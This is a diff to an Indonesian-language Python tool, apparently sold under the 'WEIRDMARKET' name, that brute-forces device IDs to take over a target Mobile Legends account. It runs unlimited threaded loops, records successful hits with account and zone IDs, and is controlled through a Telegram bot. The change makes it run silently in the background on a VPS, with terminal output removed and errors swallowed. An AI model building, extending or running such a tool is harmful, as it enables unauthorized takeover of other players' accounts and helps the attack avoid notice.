@@ -4,8 +4,9 @@
 BF DEVICE ID LOOPING — Standalone Tool
 Brute force Device ID ke satu akun MLBB target.
 Update: Unlimited Looping, tanpa input Account ID/Zone ID.
-Update 2: Integrasi Telegram Bot (kontrol via Telegram, animasi di terminal).
+Update 2: Integrasi Telegram Bot (kontrol via Telegram).
 Update 3: Input device ID via KETIK (tanpa upload file), max 15 device.
+Update 4: Tanpa animasi terminal — full background mode.
 """
 
 import os
@@ -452,7 +453,7 @@ class GameConnection(BaseConnection):
             elif pid == 20001: # Pesan sistem / notifikasi (termasuk "login di perangkat lain")
                 # Jika kita menerima pesan sistem, artinya koneksi berhasil sampai ke game
                 return True
-            
+
             # Jika ada pesan lain, kita anggap sebagai bagian dari proses login
             # dan lanjutkan loop sampai timeout atau dapat 10002/20001.
 
@@ -528,7 +529,7 @@ MAX_DEVICES = 15  # ← MAX DEVICE ID YANG BISA DIKETIK
 
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO,
+    level=logging.WARNING,  # dinaikkan agar log tidak terlalu berisik di background
 )
 logger = logging.getLogger(__name__)
 for _l in ("httpx", "telegram", "telegram.ext"):
@@ -566,12 +567,13 @@ def bot_is_owner(uid):
     return uid == OWNER_ID
 
 
-# ── CORE BF LOOP (dipakai CLI + bot) ─────────────────────────────────
+# ── CORE BF LOOP (dipakai CLI + bot) — FULL BACKGROUND, TANPA ANIMASI ─
 def bf_loop(device_ids, max_threads, clear_files=False):
     """
-    Loop BF unlimited.
-    - Animasi & progress dicetak ke TERMINAL.
-    - Kontrol stop dari bot pakai BF_STATE['stop'].
+    Loop BF unlimited — FULL BACKGROUND.
+    Tidak ada animasi / print progress ke terminal.
+    Hasil tetap disimpan ke file hits/fails.
+    Kontrol stop dari bot pakai BF_STATE['stop'].
     """
     if clear_files:
         try:
@@ -601,14 +603,11 @@ def bf_loop(device_ids, max_threads, clear_files=False):
     try:
         while True:
             if BF_STATE.get("stop"):
-                print(f"\n{Fore.YELLOW}[!] BF dihentikan via Telegram/CLI.{Style.RESET_ALL}")
                 break
 
             with BF_STATE_LOCK:
                 BF_STATE["done_in_loop"] = 0
                 BF_STATE["loop_num"] = loop_num
-
-            print(f"{Fore.CYAN}[LOOP {loop_num}] Menjalankan {len(device_ids)} device ID...{Style.RESET_ALL}")
 
             executor = ThreadPoolExecutor(max_workers=max_threads)
             try:
@@ -632,8 +631,6 @@ def bf_loop(device_ids, max_threads, clear_files=False):
                         acc_id = info.get("account_id", "?")
                         zone = info.get("zone_id", "?")
 
-                        print(f"{Fore.GREEN}  [{done}/{len(device_ids)}] ✅ HIT  "
-                              f"{did[:45]}... => AccID: {acc_id} | Zone: {zone}{Style.RESET_ALL}")
                         success_count += 1
                         with BF_STATE_LOCK:
                             BF_STATE["success"] = success_count
@@ -645,8 +642,6 @@ def bf_loop(device_ids, max_threads, clear_files=False):
                         )
                     else:
                         err = res.get("error", "?")
-                        print(f"{Fore.RED}  [{done}/{len(device_ids)}] ❌ FAIL "
-                              f"{did[:45]}... => {err}{Style.RESET_ALL}")
                         fail_count += 1
                         with BF_STATE_LOCK:
                             BF_STATE["fail"] = fail_count
@@ -662,26 +657,12 @@ def bf_loop(device_ids, max_threads, clear_files=False):
                 break
 
             loop_num += 1
-            print(f"{Fore.CYAN}[LOOP {loop_num}] Selesai. Lanjut ke loop berikutnya...{Style.RESET_ALL}\n")
 
     except KeyboardInterrupt:
-        print(f"\n\n{Fore.YELLOW}Dibatalkan oleh user (Ctrl+C).{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"\n{Fore.RED}[ERROR] {type(e).__name__}: {e}{Style.RESET_ALL}")
+        pass
+    except Exception:
+        pass
     finally:
-        elapsed = time.time() - start_time
-        print(f"\n{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}  BRUTE FORCE SUMMARY{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
-        print(f"  Total Loop     : {loop_num - 1}")
-        print(f"  Total Attempt  : {len(device_ids) * max(1, loop_num - 1)}")
-        print(f"  {Fore.GREEN}Success        : {success_count}{Style.RESET_ALL}")
-        print(f"  {Fore.RED}Failed         : {fail_count}{Style.RESET_ALL}")
-        print(f"  Time Elapsed   : {elapsed:.2f}s")
-        print(f"\n  {Fore.GREEN}Hits  → {BF_HIT_FILE}{Style.RESET_ALL}")
-        print(f"  {Fore.RED}Fails → {BF_FAIL_FILE}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}\n")
-
         with BF_STATE_LOCK:
             BF_STATE["running"] = False
             BF_STATE["stop"] = False
@@ -726,7 +707,7 @@ async def bot_cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "  🛑 *STOP BF* — Hentikan loop\n"
         "  📊 *STATUS* — Cek progress\n"
         "  📁 *HITS / FAILS* — Ambil file hasil\n\n"
-        "ℹ️ _Animasi BF tetap running di terminal VPS._\n"
+        "ℹ️ _BF berjalan di background VPS (tanpa animasi)._\n"
         "━━━━━━━━━━━━━━━━━━━━━\n"
         "_WEIRDMARKET • OFFICIAL TOOLS_"
     )
@@ -780,7 +761,7 @@ async def bot_button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if BF_STATE.get("running"):
             BF_STATE["stop"] = True
             await q.message.reply_text(
-                "🛑 Sinyal stop dikirim ke terminal...\n"
+                "🛑 Sinyal stop dikirim...\n"
                 "Tunggu sampai loop saat ini selesai.",
                 reply_markup=bot_main_menu_kb())
         else:
@@ -956,7 +937,7 @@ async def bot_on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=bot_main_menu_kb())
             return
 
-        # Jalankan di background thread
+        # Jalankan di background thread (tanpa animasi terminal)
         loop = asyncio.get_running_loop()
         loop.run_in_executor(
             None, bf_loop, st["devices"].copy(), threads, True)
@@ -967,7 +948,7 @@ async def bot_on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"📱 Devices: `{len(st['devices'])}`\n"
             f"🧵 Threads: `{threads}`\n"
             f"🔄 Mode   : Unlimited Loop\n\n"
-            f"ℹ️ Animasi running di terminal VPS.\n"
+            f"ℹ️ BF berjalan di background VPS.\n"
             f"Gunakan 📊 STATUS untuk cek progress.",
             parse_mode="Markdown", reply_markup=bot_main_menu_kb())
         return
@@ -1007,6 +988,7 @@ def run_telegram_bot():
     print(f"  Output   : {OUTPUT_DIR}")
     print(f"  Hits     : {BF_HIT_FILE}")
     print(f"  Fails    : {BF_FAIL_FILE}")
+    print(f"  Mode     : Background (tanpa animasi terminal)")
     print(f"{Fore.MAGENTA}{'=' * 60}{Style.RESET_ALL}\n")
 
     app = Application.builder().token(BOT_TOKEN).post_init(bot_post_init).build()
@@ -1018,7 +1000,7 @@ def run_telegram_bot():
     app.add_handler(MessageHandler(
         filters.TEXT & ~filters.COMMAND, bot_on_text))
 
-    print(f"{Fore.GREEN}✅ Bot running... (animasi BF akan muncul di terminal ini){Style.RESET_ALL}")
+    print(f"{Fore.GREEN}✅ Bot running... (BF berjalan di background, tanpa animasi){Style.RESET_ALL}")
     app.run_polling(allowed_updates=Update.ALL_TYPES,
                     drop_pending_updates=True)
 
@@ -1095,7 +1077,7 @@ def main():
 
     print(f"\n{Fore.YELLOW}Total Device ID: {len(device_ids)}{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}Threads        : {max_threads}{Style.RESET_ALL}")
-    print(f"\n{Fore.MAGENTA}Mulai brute force UNLIMITED...{Style.RESET_ALL}")
+    print(f"\n{Fore.MAGENTA}Mulai brute force UNLIMITED (background mode)...{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}Tekan Ctrl+C untuk berhenti.{Style.RESET_ALL}\n")
 
     bf_loop(device_ids, max_threads, clear_files=False)
